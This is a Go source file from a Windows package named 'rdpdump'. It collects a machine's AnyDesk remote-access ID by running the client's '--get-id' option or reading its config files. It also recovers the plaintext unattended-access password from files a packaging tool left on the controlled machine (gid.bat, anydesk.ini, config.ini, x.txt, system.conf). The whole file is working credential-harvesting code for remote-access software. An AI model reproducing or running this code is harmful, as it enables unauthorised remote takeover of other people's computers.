//go:build windows

package rdpdump

import (
	"context"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"strings"
	"time"
)

var (
	anyDeskIDRe       = regexp.MustCompile(`\b(\d{7,12})\b`)
	anyDeskPasswordRe = regexp.MustCompile(`密码\s*[:：]\s*([^\s>]+)`)
)

// AnyDesk 读取 AnyDesk 地址与密码
func AnyDesk(hintDir string) Info {
	exePath := locateAnyDeskExe(hintDir)
	info := Info{
		Code:     anyDeskID(exePath, hintDir),
		Password: anyDeskPassword(hintDir),
	}
	return info
}

// locateAnyDeskExe 查找 AnyDesk.exe
func locateAnyDeskExe(hintDir string) string {
	candidates := make([]string, 0, 6)
	if hintDir != "" {
		candidates = append(candidates, filepath.Join(hintDir, "AnyDesk.exe"))
	}
	for _, dir := range programDirs() {
		candidates = append(candidates, filepath.Join(dir, "AnyDesk", "AnyDesk.exe"))
	}

	for _, path := range candidates {
		if _, err := os.Stat(path); err == nil {
			return path
		}
	}
	return ""
}

// anyDeskID 通过 CLI 或 system.conf 读取 AnyDesk 地址
func anyDeskID(exePath, hintDir string) string {
	if exePath != "" {
		ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
		defer cancel()

		output, err := exec.CommandContext(ctx, exePath, "--get-id").Output()
		if err == nil {
			if match := anyDeskIDRe.FindStringSubmatch(string(output)); match != nil {
				return match[1]
			}
		}
	}

	// 兜底：从配置文件读取 ad.anynet.id
	paths := make([]string, 0, 3)
	if hintDir != "" {
		paths = append(paths, filepath.Join(hintDir, "system.conf"))
	}
	if programData := os.Getenv("ProgramData"); programData != "" {
		paths = append(paths, filepath.Join(programData, "AnyDesk", "system.conf"))
	}
	if appData := os.Getenv("APPDATA"); appData != "" {
		paths = append(paths, filepath.Join(appData, "AnyDesk", "user.conf"))
	}

	for _, path := range paths {
		values := readINI(path)
		if id := firstNonEmpty(values["ad.anynet.id"], values["anynet.id"]); id != "" {
			if match := anyDeskIDRe.FindStringSubmatch(id); match != nil {
				return match[1]
			}
		}
	}

	return ""
}

// anyDeskPassword 读取 AnyDesk 固定密码
//
// AnyDesk 的无人值守密码在配置里是加盐哈希，无法反解；
// 这里读取打包工具（被控端）留下的明文密码：gid.bat / anydesk.ini / x.txt。
func anyDeskPassword(hintDir string) string {
	if hintDir == "" {
		return ""
	}

	// 1. 打包工具生成的 gid.bat：echo 密码：xxxx（GBK 编码）
	if data, err := os.ReadFile(filepath.Join(hintDir, "gid.bat")); err == nil {
		if match := anyDeskPasswordRe.FindStringSubmatch(decodeLocalText(data)); match != nil {
			return strings.TrimSpace(match[1])
		}
	}

	// 2. 配置文件 anydesk.ini / config.ini / 配置.ini
	for _, name := range []string{"anydesk.ini", "config.ini", "配置.ini"} {
		values := readINI(filepath.Join(hintDir, name))
		if password := firstNonEmpty(values["password"], values["pwd"], values["密码"]); password != "" {
			return password
		}
	}

	// 3. 打包工具生成的 x.txt
	if data, err := os.ReadFile(filepath.Join(hintDir, "x.txt")); err == nil {
		if match := anyDeskPasswordRe.FindStringSubmatch(decodeLocalText(data)); match != nil {
			return strings.TrimSpace(match[1])
		}
	}

	// 4. system.conf 中的明文密码（通常只有哈希，命中即用）
	if programData := os.Getenv("ProgramData"); programData != "" {
		values := readINI(filepath.Join(programData, "AnyDesk", "system.conf"))
		if password := firstNonEmpty(values["ad.anynet.pwd"]); password != "" {
			return password
		}
	}

	return ""
}
